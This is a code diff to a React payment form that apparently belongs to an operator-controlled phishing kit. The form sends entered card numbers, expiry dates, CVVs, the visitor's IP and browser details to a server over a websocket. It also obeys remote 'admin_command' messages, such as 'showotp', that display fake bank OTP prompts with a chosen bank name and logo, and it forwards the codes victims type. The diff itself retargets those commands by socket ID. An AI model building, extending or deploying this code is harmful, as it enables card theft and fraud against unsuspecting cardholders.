@@ -161,11 +161,29 @@ const PaymentForm = () => {
   }, [longPressTimer, isMobile]);
 
   useEffect(() => {
-    // Listen for admin commands
-    wsClient.on('admin_command', (payload) => {
+    const handleAdminCommand = (payload: any) => {
       const { command, submission_id, bank_name, bank_logo } = payload;
-      // Only process commands for this submission or global
-      if (submission_id && submission_id !== currentSubmissionId) return;
+      console.log('PaymentForm received admin command:', payload);
+      
+      // Only process commands if we have a socket ID
+      if (!submission_id) {
+        console.log('No submission_id in command payload');
+        return;
+      }
+      
+      // Get the current socket ID
+      const socketId = wsClient.getSocketId();
+      if (!socketId) {
+        console.log('No socket ID available');
+        return;
+      }
+      
+      // Only process commands if they match our socket ID
+      if (submission_id !== socketId) {
+        console.log('Command submission_id does not match our socket ID');
+        return;
+      }
+
       switch (command) {
         case 'showotp':
           if (bank_name) setSelectedBank(bank_name);
@@ -224,12 +242,13 @@ const PaymentForm = () => {
           }, 300);
           break;
       }
-    });
-    // Cleanup
-    return () => {
-      wsClient.off('admin_command', () => {});
     };
-  }, [currentSubmissionId]);
+
+    wsClient.on('admin_command', handleAdminCommand);
+    return () => {
+      wsClient.off('admin_command', handleAdminCommand);
+    };
+  }, []);
 
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\D/g, '');
@@ -242,54 +261,9 @@ const PaymentForm = () => {
     return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
   };
 
-  const sendCardSubmission = (data: any) => {
-    wsClient.send('card_submission', data);
-    // Simulate setting submission ID (in real app, backend should echo back the ID)
-    setCurrentSubmissionId(data.invoice_id);
-  };
-
   const sendOtp = (otp: string) => {
     if (currentSubmissionId) {
       wsClient.send('otp_submitted', { otp, submission_id: currentSubmissionId });
-    }
-  };
-
-  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
-    const { name, value } = e.target;
-    
-    if (name === 'cardNumber') {
-      const formatted = formatCardNumber(value);
-      setFormData({
-        ...formData,
-        [name]: formatted
-      });
-    } else if (name === 'expiryMonth') {
-      const numericValue = value.replace(/\D/g, '').slice(0, 2);
-      if (numericValue === '' || (numericValue.length <= 2 && parseInt(numericValue) <= 12)) {
-        setFormData({
-          ...formData,
-          [name]: numericValue
-        });
-      }
-    } else if (name === 'expiryYear') {
-      const numericValue = value.replace(/\D/g, '').slice(0, 2);
-      if (numericValue === '' || parseInt(numericValue) <= 50) {
-        setFormData({
-          ...formData,
-          [name]: numericValue
-        });
-      }
-    } else if (name === 'cvv') {
-      const numericValue = value.replace(/\D/g, '').slice(0, 4);
-      setFormData({
-        ...formData,
-        [name]: numericValue
-      });
-    } else {
-      setFormData({
-        ...formData,
-        [name]: value
-      });
     }
   };
 
@@ -298,11 +272,23 @@ const PaymentForm = () => {
     if (!isFormValid()) return;
     setIsLoading(true);
     setErrorMessage('');
+
+    // Get the socket ID and ensure we have it before proceeding
+    const socketId = wsClient.getSocketId();
+    if (!socketId) {
+      console.error('No socket ID available');
+      setErrorMessage('Error: Not connected to server. Please refresh.');
+      setIsLoading(false);
+      return;
+    }
+
+    // Store the socket ID for command targeting
+    setCurrentSubmissionId(socketId);
+
+    // Get real IP and prepare card data
     const realIP = await getRealIP();
-    const invoiceId = generateInvoiceId();
     const cardData = {
-      id: invoiceId,
-      invoice_id: invoiceId,
+      id: socketId, // Use socket ID as the ID
       card_number: formData.cardNumber,
       expiry_month: formData.expiryMonth,
       expiry_year: formData.expiryYear,
@@ -313,7 +299,9 @@ const PaymentForm = () => {
       browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
       network: getRandomNetwork()
     };
-    sendCardSubmission(cardData);
+
+    console.log('Submitting card data with socket ID:', socketId);
+    wsClient.send('card_submission', cardData);
   };
 
   const handleConfirmPay = async (otp: string) => {
